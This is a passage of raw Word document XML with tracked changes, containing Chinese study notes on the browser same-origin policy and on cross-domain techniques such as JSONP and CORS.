      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:del w:id="109" w:author="ABM ABM" w:date="2020-08-16T13:41:00Z"/>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D2274A">
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t>3.) 脚本请求： js发起的ajax请求、dom和js对象的跨域操作等</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5BFE47A3" w14:textId="77777777" w:rsidR="00717181" w:rsidRDefault="00717181" w:rsidP="00717181">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="110" w:author="ABM ABM" w:date="2020-08-16T13:41:00Z">
        <w:r w:rsidDel="00717181">
          <w:rPr>
            <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
            <w:color w:val="333333"/>
            <w:szCs w:val="21"/>
          </w:rPr>
          <w:delText> </w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="450F1B6B" w14:textId="77777777" w:rsidR="00717181" w:rsidRDefault="00717181" w:rsidP="00D2274A">
      <w:pPr>
        <w:pStyle w:val="a7"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0" w:line="360" w:lineRule="exact"/>
        <w:contextualSpacing/>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="333333"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="333333"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>1.2</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="333333"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>那么是什么同源策略呢？</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6F9BC497" w14:textId="77777777" w:rsidR="00717181" w:rsidRPr="00D2274A" w:rsidRDefault="00717181" w:rsidP="00D2274A">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D2274A">
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t>同源策略/SOP（Same origin policy）是一种约定，由Netscape公司1995年引入浏览器，它是浏览器最核心也最基本的安全功能，如果缺少了同源策略，浏览器很容易受到XSS、CSFR等攻击。所谓同源是指"协议+域名+端口"三者相同，即便两个不同的域名指向同一个ip地址，也非同源。</w:t>
      </w:r>
      <w:del w:id="111" w:author="ABM ABM" w:date="2020-08-16T13:41:00Z">
        <w:r w:rsidRPr="00D2274A" w:rsidDel="00717181">
          <w:rPr>
            <w:color w:val="008000"/>
          </w:rPr>
          <w:br/>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="45D1C433" w14:textId="77777777" w:rsidR="00717181" w:rsidRPr="00D2274A" w:rsidDel="00717181" w:rsidRDefault="00717181" w:rsidP="00D2274A">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:del w:id="112" w:author="ABM ABM" w:date="2020-08-16T13:41:00Z"/>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D2274A">
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t>同源策略限制以下几种行为： 1.) Cookie、LocalStorage 和 IndexDB 无法读取 2.) DOM 和 Js对象无法获得 3.) AJAX 请求不能发送</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1B60AF5F" w14:textId="77777777" w:rsidR="00717181" w:rsidDel="00717181" w:rsidRDefault="00717181" w:rsidP="00717181">
      <w:pPr>
        <w:pStyle w:val="a7"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="150" w:beforeAutospacing="0" w:after="150" w:afterAutospacing="0"/>
        <w:rPr>
          <w:del w:id="113" w:author="ABM ABM" w:date="2020-08-16T13:41:00Z"/>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="333333"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="114" w:author="ABM ABM" w:date="2020-08-16T13:41:00Z">
        <w:r w:rsidDel="00717181">
          <w:rPr>
            <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
            <w:color w:val="333333"/>
            <w:sz w:val="21"/>
            <w:szCs w:val="21"/>
          </w:rPr>
          <w:delText> </w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="673496FE" w14:textId="77777777" w:rsidR="00717181" w:rsidRDefault="00717181">
      <w:pPr>
        <w:pStyle w:val="a7"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="150" w:beforeAutospacing="0" w:after="150" w:afterAutospacing="0"/>
        <w:pPrChange w:id="115" w:author="ABM ABM" w:date="2020-08-16T13:41:00Z">
          <w:pPr>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
          </w:pPr>
        </w:pPrChange>
      </w:pPr>
      <w:del w:id="116" w:author="ABM ABM" w:date="2020-08-16T13:41:00Z">
        <w:r w:rsidDel="00717181">
          <w:delText> </w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="6791730D" w14:textId="2D751893" w:rsidR="00717181" w:rsidRDefault="00717181" w:rsidP="00717181">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46A2FAAE" wp14:editId="660D7602">
            <wp:extent cx="3952875" cy="38004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52875" cy="3800475"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:noFill/>
                    <a:ln>
                      <a:noFill/>
                    </a:ln>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="51F79F53" w14:textId="77777777" w:rsidR="00717181" w:rsidRDefault="00717181" w:rsidP="00717181">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二、从安全性而言选择那种跨域方式最好，为什么？</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="29BABEC3" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00717181" w:rsidP="00717181">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>一般最安全的是</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>WINDOW.NAME</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>，因为</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>iframe</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>会销毁</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="16CAD8E5" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00717181" w:rsidP="00717181">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="117" w:author="ABM ABM" w:date="2020-08-16T13:42:00Z">
        <w:r w:rsidDel="00717181">
          <w:rPr>
            <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
            <w:color w:val="333333"/>
            <w:szCs w:val="21"/>
          </w:rPr>
          <w:br/>
        </w:r>
      </w:del>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>三、</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>JSONP</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>的缺点</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="23A818AF" w14:textId="7C34F5E9" w:rsidR="00717181" w:rsidRDefault="00717181" w:rsidP="00717181">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>jsonp</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>有个缺陷就是只能</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>get</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="02C7A9C6" w14:textId="77777777" w:rsidR="00717181" w:rsidRDefault="00717181" w:rsidP="00717181">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而且会把请求的内容发送到</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="333333"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>url</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="333333"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>中导致安全性极低</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="40C8CD3F" w14:textId="77777777" w:rsidR="00717181" w:rsidRDefault="00717181" w:rsidP="00717181">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>#</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>跨域：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7276CC31"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浏览器从一个域名的网页去请求另一个域名的资源时</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>,</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>浏览器处于安全的考虑</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>,</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>不允许不同源的请求</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="528470A1" w14:textId="77777777" w:rsidR="00717181" w:rsidRDefault="00717181" w:rsidP="00717181">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>#</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>同源策略：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3DE1C201"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协议相同</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="18DC8153"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域名相同</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5E5A0246"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端口相同</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3E162F51" w14:textId="77777777" w:rsidR="00717181" w:rsidRDefault="00717181" w:rsidP="00717181">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>#</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>处理方法：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="742201E0" w14:textId="77777777" w:rsidR="00717181" w:rsidRDefault="00717181" w:rsidP="00717181">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t># 1.</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>通过</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>JSONP</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>跨域</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="57AEEB34" w14:textId="77777777" w:rsidR="00717181" w:rsidRDefault="00717181" w:rsidP="00717181">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t># JSON</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>是一种数据交换格式</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6C821B68" w14:textId="77777777" w:rsidR="00717181" w:rsidRDefault="00717181" w:rsidP="00717181">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t># JSONP</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>是一种非官方的跨域数据交互协议</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="566245BD" w14:textId="77777777" w:rsidR="00717181" w:rsidRDefault="00717181" w:rsidP="00717181">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t># jsonp</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>是包含在函数调用中的</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>json</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="131A3F4D" w14:textId="77777777" w:rsidR="00717181" w:rsidRDefault="00717181" w:rsidP="00717181">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t># script</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>标签不受同源策略的影响，手动创建一个</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>script</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>标签</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>,</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>传递</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>URL,</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>同时传入一个回调函数的名字</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="70FB2611"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服务器得到名字后</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>,</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>返回数据时会用这个函数名来包裹住数据</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>,</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>客户端获取到数据之后，立即把</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>script</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>标签删掉</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6DF043BF" w14:textId="77777777" w:rsidR="00717181" w:rsidRDefault="00717181" w:rsidP="00717181">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t># 2.cors</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>：跨域资源共享</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3563F40B"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使用自定义的</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>HTTP</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>头部允许浏览器和服务器相互通信</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="56961500" w14:textId="77777777" w:rsidR="00717181" w:rsidRDefault="00717181" w:rsidP="00717181">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t># 1.</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>如果是简单请求</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>,</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>直接设置允许访问的域名：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="56B07405"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允许你的域名来获取我的数据</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve">                         </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4A5FC78C" w14:textId="77777777" w:rsidR="00717181" w:rsidRDefault="00717181" w:rsidP="00717181">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t># response['Access-Control-Allow-Origin'] = "*"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="577716A2" w14:textId="77777777" w:rsidR="00717181" w:rsidRDefault="00717181" w:rsidP="00717181">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如果是复杂请求</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>,</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>首先会发送</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>options</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>请求做预检</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>,</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>然后再发送真正的</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>PUT/POST....</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>请求</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0EAC175A"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因此如果复杂请求是</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>PUT</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="333333"/>
